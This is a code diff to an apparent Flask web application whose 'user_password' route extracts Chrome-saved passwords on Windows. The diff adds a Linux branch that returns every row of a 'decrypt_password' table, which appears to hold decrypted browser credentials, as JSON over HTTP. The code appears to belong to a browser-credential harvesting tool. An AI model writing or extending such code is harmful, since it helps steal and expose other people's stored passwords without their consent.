@@ -382,7 +382,29 @@ def user_password():
             extract_windows_chrome_passwords()
             return jsonify({"message": "User passwords update successfully"})
         elif system == 'Linux':
-            return jsonify({"error": "Linux Chrome password extraction not implemented"}), 501
+            # On Linux, just return any passwords already in the database
+            try:
+                conn = get_db_connection()
+                if not conn:
+                    return jsonify({"error": "Database connection failed"}), 500
+                    
+                cursor = conn.cursor()
+                cursor.execute('SELECT * FROM decrypt_password')
+                rows = cursor.fetchall()
+                
+                # Return the data as JSON
+                data = []
+                for row in rows:
+                    data.append(dict(row))
+                
+                conn.close()
+                if data:
+                    return jsonify(data)
+                else:
+                    return jsonify({"message": "No saved passwords available"}), 200
+            except Exception as e:
+                logger.error(f"Error retrieving saved passwords: {str(e)}")
+                return jsonify({"error": "Linux extraction not implemented, and no saved passwords found"}), 501
         elif system == 'Darwin':  # macOS
             return jsonify({"error": "macOS Chrome password extraction not implemented"}), 501
         else:
